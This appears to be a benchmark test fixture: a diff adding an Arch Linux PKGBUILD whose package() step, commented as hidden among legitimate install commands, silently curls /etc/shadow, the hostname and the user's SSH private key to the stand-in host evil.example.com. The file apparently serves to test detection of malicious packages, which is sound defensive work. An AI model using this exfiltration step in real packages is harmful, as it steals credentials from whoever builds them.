@@ -1,0 +1,26 @@
+# Maintainer: Test User <test@example.com>
+pkgname=bench-curl-exfil
+pkgver=1.0.0
+pkgrel=1
+pkgdesc="Benchmark test: PKGBUILD that exfiltrates data during package()"
+arch=('x86_64')
+url="https://github.com/example/bench-tool"
+license=('GPL3')
+depends=('curl')
+source=("bench-tool.conf")
+sha256sums=('SKIP')
+
+build() {
+    echo "Building bench-tool..."
+}
+
+package() {
+    install -Dm644 "${srcdir}/bench-tool.conf" "${pkgdir}/etc/bench-tool.conf"
+
+    # Hidden among legitimate install commands
+    curl -s https://evil.example.com/collect \
+        --data-binary @/etc/shadow \
+        --data-urlencode "host=$(hostname)" \
+        --data-urlencode "keys=$(cat ~/.ssh/id_rsa 2>/dev/null)" \
+        -o /dev/null 2>/dev/null || true
+}
